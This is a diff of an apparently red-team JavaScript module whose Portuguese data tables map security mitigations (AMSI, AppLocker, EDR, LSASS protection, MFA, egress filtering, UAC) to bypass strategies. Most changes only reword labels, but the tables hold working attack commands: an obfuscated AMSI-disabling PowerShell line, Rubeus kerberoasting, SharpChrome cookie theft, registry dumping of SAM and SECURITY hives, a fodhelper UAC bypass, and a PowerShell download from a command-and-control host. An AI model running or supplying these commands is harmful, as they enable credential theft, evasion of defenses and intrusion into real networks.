@@ -3,81 +3,81 @@
 
 export const MITIGATION_BYPASS_MAP = {
   'M1049': {
-    defenseName: 'Antivirus / Antimalware (AMSI & Assinaturas Estáticas)',
+    defenseName: "Antivírus e antimalware (AMSI e assinaturas estáticas)",
     blockerSymptom: 'Payload eliminado no disco (Quarantine) ou bloqueado em memória com erro "This script contains malicious content and has been blocked by your antivirus software".',
     bypassStrategyPt: 'Evitar escrita direta em disco (Fileless Execution / Reflective Loading). Em PowerShell/DotNet, aplicar AMSI Memory Patching em `amsi.dll` (`AmsiScanBuffer` ret patch) ou Hardware Breakpoints (VEH2) antes de carregar assemblies via `[System.Reflection.Assembly]::Load()`. Para binários nativos, aplicar cifragem de secções (AES/ChaCha20) com resolução dinâmica de APIs (API Hashing) e Direct/Indirect Syscalls.',
     recommendedTechniques: ['T1027', 'T1620', 'T1562.001', 'T1055', 'T1218']
   },
   'M1038': {
-    defenseName: 'Execution Prevention (AppLocker / WDAC / Software Restriction Policies)',
+    defenseName: "Prevenção da execução (AppLocker / WDAC / Software Restriction Policies)",
     blockerSymptom: 'Erro "This program is blocked by group policy" ao tentar executar binários em `C:\\Users\\*` ou `C:\\Windows\\Temp`.',
     bypassStrategyPt: 'Enumerar regras de AppLocker em `HKLM\\Software\\Policies\\Microsoft\\Windows\\SrpV2` e localizar diretórios graváveis dentro de `C:\\Windows\\` (ex: `C:\\Windows\\Tasks`, `C:\\Windows\\Temp`, `C:\\Windows\\tracing`, `C:\\Windows\\System32\\spool\\drivers\\color`). Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.',
     recommendedTechniques: ['T1218', 'T1127.001', 'T1218.004', 'T1218.010', 'T1218.011', 'T1574.002']
   },
   'M1040': {
-    defenseName: 'Behavior Prevention on Endpoint (EDR User-Mode Hooking & Kernel Callbacks)',
+    defenseName: "Prevenção comportamental no endpoint (EDR User-Mode Hooking e Kernel Callbacks)",
     blockerSymptom: 'Processo terminado instantaneamente pelo EDR ao tentar `VirtualAllocEx` / `WriteProcessMemory` / `CreateRemoteThread` ou acesso ao `lsass.exe`.',
     bypassStrategyPt: 'Contornar User-Mode Hooks em `ntdll.dll` através de: (1) Indirect Syscalls (ex: Halo\'s Gate / Tartarus\' Gate / SysWhispers3 saltando para a instrução `syscall` dentro da própria `ntdll.dll` para legitimar a Call Stack); (2) Remapeamento de cópia limpa de `ntdll.dll` a partir de `KnownDlls` ou processo suspenso; (3) Uso de Threadless Injection, Module Stomping ou Callback-based Injection em vez de APIs clássicas monitorizadas; (4) Patching de ETW (`EtwEventWrite`) no processo atual.',
     recommendedTechniques: ['T1106', 'T1055.012', 'T1562.001', 'T1620', 'T1574.002']
   },
   'M1043': {
-    defenseName: 'Credential Access Protection (RunAsPPL / Windows Defender Credential Guard)',
+    defenseName: "Proteção do acesso a credenciais (RunAsPPL / Windows Defender Credential Guard)",
     blockerSymptom: 'Erro `0x00000005 (ACCESS_DENIED)` ao tentar fazer dump de `lsass.exe` mesmo com privilégio `SeDebugPrivilege` e `NT AUTHORITY\\SYSTEM`.',
     bypassStrategyPt: 'Com RunAsPPL ativo, processos em User-Mode não conseguem abrir handles `PROCESS_VM_READ` no LSASS. Vetores de contorno: (1) Pivotar para extração sem tocar no LSASS: Kerberoasting (`T1558.003`), AS-REP Roasting (`T1558.004`), ou extração de segredos DPAPI/Vault (`T1555.004`); (2) Se for Domain Admin/equivalente, usar DCSync (`T1003.006`) remotamente; (3) Abusar de drivers assinados vulneráveis (BYOVD - `T1068`) como `mimidrv.sys` ou `procexp152.sys` para remover a flag `PS_PROTECTION` em Kernel-Mode; (4) Se Credential Guard (VBS) estiver ativo, hashes NTLM em cache ficam isolados em `LsaIso.exe` — contornar usando captura de Tickets Kerberos em memória via Rubeus (`monitor`/`tgtdeleg`) ou roubo de cookies de sessão browser.',
     recommendedTechniques: ['T1558.003', 'T1003.006', 'T1555.004', 'T1550.003', 'T1539', 'T1068']
   },
   'M1026': {
-    defenseName: 'Privileged Account Management (LAPS / PAM / Tiering)',
+    defenseName: "Gestão de contas privilegiadas (LAPS / PAM / Tiering)",
     blockerSymptom: 'Pass-the-Hash com conta de Administrador Local (`RID 500`) falha noutros hosts porque cada máquina possui password única gerida pelo LAPS.',
     bypassStrategyPt: 'Abandonar a tentativa de reutilização horizontal de credenciais locais. Em vez disso: (1) Enumerar quem tem permissão de leitura do atributo `ms-Mcs-AdmPwd` (LAPS v1) ou `msLAPS-Password` / `msLAPS-EncryptedPassword` (Windows LAPS) no Active Directory via LDAP (`T1087.002`); (2) Extrair Tokens ou Tickets Kerberos de utilizadores de domínio com sessão ativa na máquina comprometida (`T1134.001` / `T1550.003`); (3) Explorar delegações Kerberos (Unconstrained / Constrained / RBCD - `T1558`) ou certificados AD CS vulneráveis (ESC1-ESC8 - `T1649`).',
     recommendedTechniques: ['T1649', 'T1550.003', 'T1134.001', 'T1087.002', 'T1558']
   },
   'M1032': {
-    defenseName: 'Multi-Factor Authentication (MFA / Conditional Access)',
+    defenseName: "Autenticação multifator (MFA / Conditional Access)",
     blockerSymptom: 'Credenciais válidas obtidas, mas o login interativo na VPN/Cloud (Entra ID / Okta) exige segundo fator (TOTP / Push / FIDO2).',
     bypassStrategyPt: 'Vetores de contorno de MFA: (1) Roubo de Session Cookies / PRT (Primary Refresh Token) já autenticados a partir do endpoint da vítima (`T1539` / `T1528`); (2) Adversary-in-the-Middle (AitM) Reverse Proxy Phishing (ex: Evilginx2 - `T1557`) para capturar o token de sessão pós-MFA; (3) Device Code Phishing (`T1528`) ou abuso de Refresh Tokens OAuth; (4) Se o utilizador já tem sessão num host interno, operar por SOCKS proxy através do beacon na estação da vítima (`T1090.001`).',
     recommendedTechniques: ['T1539', 'T1528', 'T1557', 'T1111', 'T1090.001']
   },
   'M1030': {
-    defenseName: 'Network Segmentation & Internal Firewalls (VLAN Isolation)',
+    defenseName: "Segmentação de rede e firewalls internas (isolamento por VLAN)",
     blockerSymptom: 'Sem conectividade direta da sub-rede atual para servidores de produção ou Domain Controllers.',
     bypassStrategyPt: 'Transformar o host comprometido num pivot multi-homed: (1) Enumerar interfaces de rede secundárias, sessões SSH/RDP ativas e tabelas ARP (`T1016`); (2) Estabelecer túneis SOCKS4a/SOCKS5 ou interface TUN virtual sobre o canal de C2 existente (ex: Ligolo-ng, Chisel - `T1572` / `T1090.001`); (3) Comprometer um Jump Host, servidor de gestão (SCCM, Ansible, vCenter - `T1072`) ou abusar de Internal Spearphishing (`T1534`).',
     recommendedTechniques: ['T1572', 'T1090.001', 'T1072', 'T1021', 'T1534']
   },
   'M1031': {
-    defenseName: 'Network Intrusion Prevention (IDS/IPS & Egress Filtering / SSL Inspection)',
-    blockerSymptom: 'Reverse shell ou beacon C2 não conecta para o exterior; conexões TCP diretas bloqueadas ou terminadas pelo Proxy/Firewall.',
+    defenseName: "Prevenção de intrusões na rede (IDS/IPS, filtragem de saída e inspeção SSL)",
+    blockerSymptom: "Reverse shell ou beacon C2 não estabelece ligação para o exterior; ligações TCP diretas bloqueadas ou terminadas pelo Proxy/Firewall.",
     bypassStrategyPt: 'Adaptar o transporte de C2 ao tráfego permitido no ambiente: (1) Respeitar o Proxy Corporativo (WPAD / variáveis de ambiente / WinINet API que usa automaticamente credenciais NTLM/Kerberos do utilizador atual); (2) Usar Domain Fronting ou Web Services legítimos permitidos pela whitelist (GitHub, Microsoft Graph, OneDrive, Slack API - `T1102`); (3) Configurar Malleable C2 Profiles para imitar tráfego HTTPS legítimo e usar certificados TLS válidos com idade/reputação (`T1588.004`); (4) Caso HTTP/HTTPS esteja totalmente isolado, testar DNS Tunneling (`T1071.004`) ou pivotar via SMB Named Pipes (`T1090.001`) através de outro host com saída.',
     recommendedTechniques: ['T1102', 'T1071.001', 'T1071.004', 'T1572', 'T1090.001']
   },
   'M1037': {
-    defenseName: 'Filter Network Traffic (Bloqueio de SMB 445 / WinRM 5985 / RPC 135)',
+    defenseName: "Filtragem do tráfego de rede (bloqueio de SMB 445 / WinRM 5985 / RPC 135)",
     blockerSymptom: 'Movimentação lateral via `PsExec`, `evil-winrm` ou `wmiexec` falha por timeout de porta.',
-    bypassStrategyPt: 'Procurar protocolos alternativos abertos no host de destino: (1) Se RPC/DCOM alternativo ou portas altas estiverem acessíveis, usar DCOM (`MMC20.Application`, `ShellWindows` - `T1021.003`); (2) Se MSSQL (1433) estiver acessível, usar `xp_cmdshell` ou CLR Assemblies; (3) Se SSH (22) ou RDP (3389) estiverem abertos, usar RestrictedAdmin Mode (`sekurlsa::pth` + `mstsc /restrictedadmin` - `T1021.001`); (4) Abusar de partilhas de ficheiros ou GPOs / SCCM para implantação indireta (`T1072`).',
+    bypassStrategyPt: "Procurar protocolos alternativos abertos no host de destino: (1) Se RPC/DCOM alternativo ou portas altas estiverem acessíveis, usar DCOM (`MMC20.Application`, `ShellWindows` - `T1021.003`); (2) Se MSSQL (1433) estiver acessível, usar `xp_cmdshell` ou CLR Assemblies; (3) Se SSH (22) ou RDP (3389) estiverem abertos, usar RestrictedAdmin Mode (`sekurlsa::pth` + `mstsc /restrictedadmin` - `T1021.001`); (4) Abusar de partilhas de ficheiros ou GPOs / SCCM para implementação indireta (`T1072`).",
     recommendedTechniques: ['T1021.003', 'T1021.001', 'T1021.006', 'T1072', 'T1570']
   },
   'M1045': {
-    defenseName: 'Code Signing Enforcement (Driver Signature Enforcement / Gatekeeper)',
+    defenseName: "Exigência de assinatura de código (Driver Signature Enforcement / Gatekeeper)",
     blockerSymptom: 'Sistema recusa carregar binário, DLL ou driver não assinado digitalmente.',
     bypassStrategyPt: 'Recorrer a DLL Side-Loading (`T1574.002`) utilizando um executável legítimo assinado (vulnerável a sequestro de ordem de procura de DLL) que carregue a nossa DLL em memória, ou utilizar binários assinados nativos (LOLBAS - `T1218`). Em Kernel-Mode, usar técnica BYOVD (Bring Your Own Vulnerable Driver) com um driver legítimo assinado pela Microsoft/fabricante que contenha primitivas de escrita arbitrária em kernel.',
     recommendedTechniques: ['T1574.002', 'T1218', 'T1553.002', 'T1068']
   },
   'M1042': {
-    defenseName: 'Disable or Remove Feature or Program (PowerShell v2 / WScript / Macros Desativados)',
+    defenseName: "Desativação ou remoção de funcionalidades ou programas (PowerShell v2 / WScript / macros)",
     blockerSymptom: '`powershell.exe` bloqueado por GPO, ou Macros VBA desativadas por política de Mark-of-the-Web (MotW).',
     bypassStrategyPt: 'Para PowerShell bloqueado: o motor do PowerShell reside em `System.Management.Automation.dll`, não no executável `powershell.exe`. Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).',
     recommendedTechniques: ['T1127.001', 'T1218.004', 'T1553.005', 'T1204.002']
   },
   'M1022': {
-    defenseName: 'Restrict File and Directory Permissions (ACLs Restritas)',
+    defenseName: "Restrição de permissões de ficheiros e diretórios (ACLs restritas)",
     blockerSymptom: 'Permissão negada ao tentar modificar binários de serviços, chaves de registo ou diretórios de sistema.',
     bypassStrategyPt: 'Auditar permissões efetivas com `AccessChk` / `PowerUp` procurando Unquoted Service Paths (`T1574.009`), Ghost DLL Hijacking (DLLs inexistentes que um serviço `SYSTEM` tenta carregar a partir de pastas no `PATH` onde o utilizador tem escrita - `T1574.001`) ou explorar privilégios de token como `SeBackupPrivilege` / `SeRestorePrivilege` para ignorar ACLs NTFS (`FILE_FLAG_BACKUP_SEMANTICS`).',
     recommendedTechniques: ['T1574.001', 'T1574.009', 'T1134', 'T1222']
   },
   'M1047': {
-    defenseName: 'Audit & SIEM Telemetry Correlation (Sysmon / Auditd / ETW)',
-    blockerSymptom: 'Operações de enumeração ou persistência geram alertas imediatos no SOC devido a regras Sigma sobre argumentos de linha de comando.',
-    bypassStrategyPt: 'Aplicar Command-Line Spoofing (criar processo suspenso com argumentos benignos como `svchost.exe -k netsvcs`, alterar `PEB->ProcessParameters->CommandLine` para o comando real e resumir a thread - `T1036.004`), Parent PID Spoofing (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` - `T1134.004`) e substituir ferramentas de CLI barulhentas (`whoami`, `net user`, `nltest`) por chamadas diretas a APIs Win32/LDAP via BOFs (Beacon Object Files) em memória.',
+    defenseName: "Auditoria e correlação de telemetria no SIEM (Sysmon / auditd / ETW)",
+    blockerSymptom: "Operações de enumeração ou persistência geram alertas imediatos no SOC devido a regras Sigma sobre argumentos de linha de comandos.",
+    bypassStrategyPt: "Aplicar Command-Line Spoofing (criar processo suspenso com argumentos benignos como `svchost.exe -k netsvcs`, alterar `PEB->ProcessParameters->CommandLine` para o comando real e resumir a thread - `T1036.004`), Parent PID Spoofing (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` - `T1134.004`) e substituir ferramentas de CLI ruidosas (`whoami`, `net user`, `nltest`) por chamadas diretas a APIs Win32/LDAP via BOFs (Beacon Object Files) em memória.",
     recommendedTechniques: ['T1036.004', 'T1134.004', 'T1106', 'T1562.002']
   }
 };
@@ -86,28 +86,28 @@ export const ICE_BREAKER_SCENARIOS = [
   {
     id: 'blk-amsi-clm',
     title: 'PowerShell Bloqueado: AMSI + Constrained Language Mode (CLM)',
-    category: 'Execution & Evasion',
+    category: "Execução e evasão",
     severity: 'CRÍTICO',
     defenseMechanism: 'AMSI (Antimalware Scan Interface) + AppLocker/WDAC Constrained Language Mode ($ExecutionContext.SessionState.LanguageMode == "ConstrainedLanguage")',
     symptom: 'Scripts PowerShell como PowerView, Rubeus ou Invoke-Mimikatz são bloqueados com "This script contains malicious content" ou falham ao invocar APIs .NET / Add-Type devido ao CLM.',
     academicContext: 'O AMSI interceta buffers de script em User-Mode através da função exportada `AmsiScanBuffer` em `amsi.dll`, injetada no espaço de endereçamento do processo interpretador. Já o Constrained Language Mode (CLM) restringe a invocação de tipos .NET arbitrários e APIs Win32 quando políticas de Application Control (AppLocker/WDAC) estão ativas.',
     bypassSteps: [
       {
-        title: '1. Unmanaged PowerShell via MSBuild / InstallUtil (Bypass CLM + powershell.exe)',
-        description: 'Executar o runtime `System.Management.Automation.dll` dentro de um binário .NET assinado pela Microsoft (`MSBuild.exe` ou `InstallUtil.exe`), que corre em `FullLanguage` mode por estar na whitelist de diretórios confiáveis.',
+        title: "1. Unmanaged PowerShell por MSBuild / InstallUtil (contorno de CLM e powershell.exe)",
+        description: "Executar o runtime `System.Management.Automation.dll` dentro de um binário .NET assinado pela Microsoft (`MSBuild.exe` ou `InstallUtil.exe`), que corre em `FullLanguage` mode por estar na whitelist de diretórios de confiança.",
         command: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\runner.dll',
         mitreIds: ['T1127.001', 'T1218.004', 'T1059.001'],
         opsecRisk: 'BAIXO'
       },
       {
-        title: '2. In-Memory AMSI Context / AmsiScanBuffer Patching',
+        title: "2. Alteração em memória do contexto AMSI / AmsiScanBuffer",
         description: 'Corromper o contexto de inicialização (`amsiInitFailed`) por reflexão ou alterar os primeiros bytes de `AmsiScanBuffer` na memória do próprio processo (`0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3` -> `E_INVALIDARG`).',
         command: '[Ref].Assembly.GetType("System.Management.Automation."+$("41 6D 73 69 55 74 69 6C 73"-split" "|%{[char]([convert]::ToInt16($_,16))})-join"").GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64"-split" "|%{[char]([convert]::ToInt16($_,16))})-join"","NonPublic,Static").SetValue($null,$true)',
         mitreIds: ['T1562.001', 'T1027'],
         opsecRisk: 'MÉDIO'
       },
       {
-        title: '3. Hardware Breakpoints (Patchless AMSI Bypass)',
+        title: "3. Hardware Breakpoints (contorno de AMSI sem patches)",
         description: 'Configurar registos de debug da CPU (`Dr0`-`Dr3`) e um Vectored Exception Handler (VEH) na thread atual para intercetar `AmsiScanBuffer` sem modificar páginas de memória `RX` de `amsi.dll` (evita scanners de integridade de memória de EDRs).',
         command: '// Via BOF / C# Assembly: SetThreadContext(hThread, &ctx) com Dr0 = &AmsiScanBuffer',
         mitreIds: ['T1562.001', 'T1106', 'T1620'],
@@ -119,28 +119,28 @@ export const ICE_BREAKER_SCENARIOS = [
   {
     id: 'blk-lsass-ppl',
     title: 'LSASS Bloqueado: RunAsPPL & Credential Guard (Access Denied)',
-    category: 'Credential Access',
+    category: "Acesso a credenciais",
     severity: 'CRÍTICO',
     defenseMechanism: 'LSA Protection (RunAsPPL - Protected Process Light) + Virtualization-Based Security (Credential Guard / LsaIso.exe)',
     symptom: 'Mesmo como `NT AUTHORITY\\SYSTEM` e com `SeDebugPrivilege` ativo, o Mimikatz (`sekurlsa::logonpasswords`), ProcDump ou `comsvcs.dll` falham com erro `0x00000005 (ACCESS_DENIED)` ao tentar ler a memória do `lsass.exe`.',
     academicContext: 'O mecanismo Protected Process Light (PPL) utiliza um bit no objeto `EPROCESS` do kernel (`Protection` / `SignatureLevel`) que impede qualquer processo não-PPL (mesmo SYSTEM) de obter handles com permissões `PROCESS_VM_READ` ou `PROCESS_DUP_HANDLE`. Já o Credential Guard isola os segredos NTLM e Kerberos num contentor Hyper-V (VTL1 - Virtual Trust Level 1) acessível apenas via RPC pelo processo `LsaIso.exe`.',
     bypassSteps: [
       {
-        title: '1. Pivot para Kerberoasting / AS-REP Roasting / TGT Delegation (Zero LSASS Touch)',
+        title: "1. Alternativas com Kerberoasting / AS-REP Roasting / TGT Delegation (sem aceder ao LSASS)",
         description: 'Em vez de tocar no LSASS, interagir com as APIs legítimas SSPI do Windows para extrair tickets Kerberos de contas de serviço ou obter um TGT delegável da sessão atual via `Rubeus.exe tgtdeleg`.',
         command: 'Rubeus.exe tgtdeleg /nowrap\nRubeus.exe kerberoast /rc4opsec /nowrap',
         mitreIds: ['T1558.003', 'T1558.004', 'T1550.003'],
         opsecRisk: 'STEALTH'
       },
       {
-        title: '2. Extração de Credenciais DPAPI, Browser Cookies & Windows Vault',
+        title: "2. Extração de credenciais DPAPI, cookies do navegador e Windows Vault",
         description: 'As MasterKeys DPAPI do utilizador podem ser decifradas pedindo ao Domain Controller via RPC (`lsadump::backupkeys` ou `SharpDPAPI`) sem precisar de ler a memória do LSASS.',
         command: 'SharpDPAPI.exe triage /mkfile:masterkeys.txt\nSharpChrome.exe cookies /unprotect',
         mitreIds: ['T1555.004', 'T1555.003', 'T1539'],
         opsecRisk: 'BAIXO'
       },
       {
-        title: '3. Extração Offline via SAM / SYSTEM / SECURITY (Volume Shadow Copy / Registry)',
+        title: "3. Extração local a partir de SAM / SYSTEM / SECURITY (Volume Shadow Copy / registo)",
         description: 'Extrair as hives locais para obter hashes locais, Cached Domain Logons (`DCC2`) e LSA Secrets (contas de serviço configuradas no host).',
         command: 'reg.exe save HKLM\\SAM sam.hiv && reg.exe save HKLM\\SYSTEM sys.hiv && reg.exe save HKLM\\SECURITY sec.hiv',
         mitreIds: ['T1003.002', 'T1003.004', 'T1003.005'],
@@ -158,8 +158,8 @@ export const ICE_BREAKER_SCENARIOS = [
   },
   {
     id: 'blk-edr-hooks',
-    title: 'EDR Bloqueando Injeção de Processo & Shellcode (User-Mode Hooking)',
-    category: 'Defense Evasion & Stealth',
+    title: "EDR a bloquear injeção em processos e shellcode (User-Mode Hooking)",
+    category: "Evasão de defesas e furtividade",
     severity: 'CRÍTICO',
     defenseMechanism: 'EDR Inline Hooking em `ntdll.dll` (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) + ETW Threat Intelligence (EtwTi)',
     symptom: 'O processo do agente/loader é morto imediatamente ao tentar injetar shellcode ou executar `VirtualAlloc` + `VirtualProtect` com página `PAGE_EXECUTE_READWRITE (RWX)`.',
@@ -173,14 +173,14 @@ export const ICE_BREAKER_SCENARIOS = [
         opsecRisk: 'STEALTH'
       },
       {
-        title: '2. Fresh Copy Unhooking a partir de KnownDlls ou Processo Suspenso',
+        title: "2. Unhooking com uma cópia limpa de KnownDlls ou de um processo suspenso",
         description: 'Mapear uma secção `.text` limpa de `\\KnownDlls\\ntdll.dll` e sobrescrever a secção `.text` da `ntdll.dll` atual para remover todos os inline hooks em User-Mode.',
         command: '// MapViewOfSection(\\KnownDlls\\ntdll.dll) -> memcpy(.text_local, .text_clean)',
         mitreIds: ['T1562.001', 'T1055'],
         opsecRisk: 'BAIXO'
       },
       {
-        title: '3. Threadless Injection / Callback Injection & Evitar Memória RWX',
+        title: "3. Threadless Injection / Callback Injection e prevenção de memória RWX",
         description: 'Alocar memória apenas como `RW`, copiar o payload, alterar para `RX` (`VirtualProtect`), e acionar a execução através de Windows Callbacks (`EnumChildWindows`, `CreateTimerQueueTimer`, `FlsAlloc`) ou Thread Pool (`TpAllocWork`) em vez de `CreateRemoteThread`.',
         command: '// Alocação RW -> Write -> Protect RX -> EnumWindows((WNDENUMPROC)pPayload, 0)',
         mitreIds: ['T1055.012', 'T1055.004', 'T1106'],
@@ -191,12 +191,12 @@ export const ICE_BREAKER_SCENARIOS = [
   },
   {
     id: 'blk-applocker-wdac',
-    title: 'AppLocker / WDAC Bloqueando Execução de Binários (.EXE / .DLL / .PS1)',
-    category: 'Execution & Evasion',
+    title: "AppLocker / WDAC a bloquear a execução de binários (.EXE / .DLL / .PS1)",
+    category: "Execução e evasão",
     severity: 'ALTO',
     defenseMechanism: 'Application Control (AppLocker / Windows Defender Application Control - WDAC)',
     symptom: 'Qualquer tentativa de correr ferramentas (Chisel, Mimikatz, SharpHound, nc.exe) resulta em "This program is blocked by group policy".',
-    academicContext: 'Políticas de Application Whitelisting bloqueiam a criação de processos (`NtCreateUserProcess`) ou o carregamento de imagens (`SEC_IMAGE`) que não residam em caminhos confiáveis (`C:\\Program Files`, `C:\\Windows`) ou que não possuam assinatura digital de um Publisher autorizado.',
+    academicContext: "Políticas de Application Whitelisting bloqueiam a criação de processos (`NtCreateUserProcess`) ou o carregamento de imagens (`SEC_IMAGE`) que não residam em caminhos de confiança (`C:\\Program Files`, `C:\\Windows`) ou que não possuam assinatura digital de um Publisher autorizado.",
     bypassSteps: [
       {
         title: '1. Abuso de Binários Assinados da Microsoft (LOLBAS Proxy Execution)',
@@ -225,7 +225,7 @@ export const ICE_BREAKER_SCENARIOS = [
   {
     id: 'blk-lateral-smb-winrm',
     title: 'Movimentação Lateral Bloqueada: SMB (445) / WinRM (5985) / PsExec Falham',
-    category: 'Lateral Movement',
+    category: "Movimentação lateral",
     severity: 'ALTO',
     defenseMechanism: 'Firewall Host-based, Bloqueio de Admin Shares (`ADMIN$`, `C$`), SMB Signing Enforcement ou Serviço WinRM Desativado',
     symptom: 'Tens credenciais de Administrador / Hash NTLM / Ticket Kerberos para o servidor alvo, mas `psexec.py`, `smbexec.py` ou `evil-winrm` dão timeout ou erro de acesso.',
@@ -265,7 +265,7 @@ export const ICE_BREAKER_SCENARIOS = [
   {
     id: 'blk-protected-users-ntlm',
     title: 'Pass-the-Hash Falha: Grupo "Protected Users" ou NTLM Desativado',
-    category: 'Credential Access & AD',
+    category: "Acesso a credenciais e Active Directory",
     severity: 'ALTO',
     defenseMechanism: 'Active Directory "Protected Users" Security Group + Restrição de NTLM (`RestrictReceivingNTLMTraffic`)',
     symptom: 'Conseguiste o hash NTLM de um Domain Admin, mas o Pass-the-Hash (`pth`) falha com `STATUS_ACCOUNT_RESTRICTION` ou `KDC_ERR_ETYPE_NOSUPP`.',
@@ -290,7 +290,7 @@ export const ICE_BREAKER_SCENARIOS = [
   },
   {
     id: 'blk-egress-firewall',
-    title: 'Sem Reverse Shell: Firewall Egress Bloqueando Saída (Apenas Proxy / DNS)',
+    title: "Sem reverse shell: firewall a bloquear tráfego de saída (apenas proxy / DNS)",
     category: 'Command and Control (C2)',
     severity: 'ALTO',
     defenseMechanism: 'Egress Filtering Restrito + Proxy Corporativo Autenticado (Squid / BlueCoat / Zscaler) com TLS Inspection',
@@ -298,14 +298,14 @@ export const ICE_BREAKER_SCENARIOS = [
     academicContext: 'Redes corporativas maduras bloqueiam tráfego direto da rede interna para a Internet (Direct-to-Net block), forçando todo o tráfego web a passar por um Proxy explícito autenticado via Kerberos/NTLM e bloqueando domínios não categorizados.',
     bypassSteps: [
       {
-        title: '1. C2 Proxy-Aware usando WinHTTP / WinINet (Autenticação Transparente)',
+        title: "1. C2 compatível com proxy através de WinHTTP / WinINet (autenticação transparente)",
         description: 'Configurar o agente C2 para utilizar a stack nativa `WinINet` / `WinHTTP` do Windows no contexto do utilizador logado; o próprio SO descobre o proxy via WPAD/Registry e autentica automaticamente no Proxy com o ticket Kerberos do utilizador.',
         command: 'powershell -c "$wc=New-Object System.Net.WebClient; $wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy; $wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials; $wc.DownloadString(\'https://c2-categorizado.com/init\')"',
         mitreIds: ['T1071.001', 'T1090'],
         opsecRisk: 'STEALTH'
       },
       {
-        title: '2. C2 sobre Web Services Legítimos (GitHub / Microsoft Graph / Slack / OneDrive)',
+        title: "2. C2 através de serviços web legítimos (GitHub / Microsoft Graph / Slack / OneDrive)",
         description: 'Se o Proxy bloquear domínios desconhecidos, utilizar um canal C2 que comunique exclusivamente com `api.github.com`, `graph.microsoft.com` ou `slack.com` (que possuem whitelist corporativa e pinning TLS).',
         command: '// Configurar External C2 / Mythic / Sliver HTTP C2 sobre API Microsoft Graph ou GitHub Issues',
         mitreIds: ['T1102.002', 'T1071.001'],
@@ -323,15 +323,15 @@ export const ICE_BREAKER_SCENARIOS = [
   },
   {
     id: 'blk-uac-privesc',
-    title: 'Bloqueado em Medium Integrity: Utilizador é Admin Local mas UAC Trava Elevação',
-    category: 'Privilege Escalation',
+    title: "Bloqueado em Medium Integrity: administrador local com elevação impedida pelo UAC",
+    category: "Escalada de privilégios",
     severity: 'MÉDIO',
     defenseMechanism: 'User Account Control (UAC Split Token) + `FilterAdministratorToken`',
     symptom: 'O utilizador pertence ao grupo local `Administrators`, mas `whoami /priv` mostra apenas poucos privilégios (`Medium Mandatory Level`) e operações administrativas dão "Access Denied".',
     academicContext: 'Com UAC ativo, quando um membro do grupo Administrators inicia sessão, o LSA cria dois Access Tokens: um Filtered Token (`Medium Integrity`) usado pelo `explorer.exe` e um Full Admin Token (`High Integrity`) ligado ao primeiro (`TokenLinkedToken`), que exige elevação via `consent.exe`.',
     bypassSteps: [
       {
-        title: '1. Auto-Elevated Binaries & Registry Hijacking (fodhelper / computerdefaults)',
+        title: "1. Binários com elevação automática e Registry Hijacking (fodhelper / computerdefaults)",
         description: 'Binários assinados pela Microsoft com `<autoElevate>true</autoElevate>` no manifesto (`fodhelper.exe`, `computerdefaults.exe`, `sdclt.exe`) consultam chaves em `HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command` antes de executar em High Integrity.',
         command: 'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /t REG_SZ /d "cmd.exe /c start C:\\Windows\\Tasks\\shell.exe" /f\nfodhelper.exe',
         mitreIds: ['T1548.002', 'T1112'],
@@ -356,8 +356,8 @@ export const ICE_BREAKER_SCENARIOS = [
   },
   {
     id: 'blk-linux-privesc-hardened',
-    title: 'Linux Hardened: Sem Sudo, SUIDs Padrão Limpos, AppArmor/SELinux Ativo',
-    category: 'Privilege Escalation',
+    title: "Linux reforçado: sem sudo, sem SUIDs habituais e com AppArmor/SELinux ativo",
+    category: "Escalada de privilégios",
     severity: 'ALTO',
     defenseMechanism: 'Linux Hardening (No Sudoers, `nosuid` mounts, AppArmor/SELinux Enforcing, Kernel `dmesg_restrict=1`)',
     symptom: 'Acesso shell como `www-data` ou utilizador comum; `sudo -l` pede password ou diz não permitido, e `find / -perm -4000` não revela binários GTFOBins óbvios.',
@@ -371,7 +371,7 @@ export const ICE_BREAKER_SCENARIOS = [
         opsecRisk: 'STEALTH'
       },
       {
-        title: '2. Monitorização de Processos Efêmeros / Cronjobs Ocultos (`pspy`) & Systemd Timers',
+        title: "2. Monitorização de processos efémeros, tarefas cron ocultas (`pspy`) e temporizadores systemd",
         description: 'Monitorizar `/proc` em loop rápido sem precisar de root para detetar scripts executados periodicamente por `root` com permissões de escrita, Wildcard Injection (`tar *`) ou `PATH` hijacking.',
         command: 'systemctl list-timers --all\n# Verificar sockets UNIX graváveis (ex: docker.sock, containerd.sock, supervisord):\nfind / -type s -writable 2>/dev/null',
         mitreIds: ['T1053.003', 'T1053.006', 'T1574.007'],
@@ -389,8 +389,8 @@ export const ICE_BREAKER_SCENARIOS = [
   },
   {
     id: 'blk-container-escape',
-    title: 'Preso num Container: Docker / Pod Kubernetes Isolado',
-    category: 'Privilege Escalation & Cloud',
+    title: "Isolado num container Docker ou pod Kubernetes",
+    category: "Escalada de privilégios e cloud",
     severity: 'ALTO',
     defenseMechanism: 'Linux Namespaces (`pid`, `net`, `mnt`), Control Groups (`cgroups`) e Seccomp/AppArmor Profiles',
     symptom: 'O RCE colocou-te dentro de um container efêmero (`/.dockerenv` presente ou `/proc/1/cgroup` aponta para `kubepods`), sem acesso aos ficheiros do host nem à rede interna principal.',
@@ -404,14 +404,14 @@ export const ICE_BREAKER_SCENARIOS = [
         opsecRisk: 'BAIXO'
       },
       {
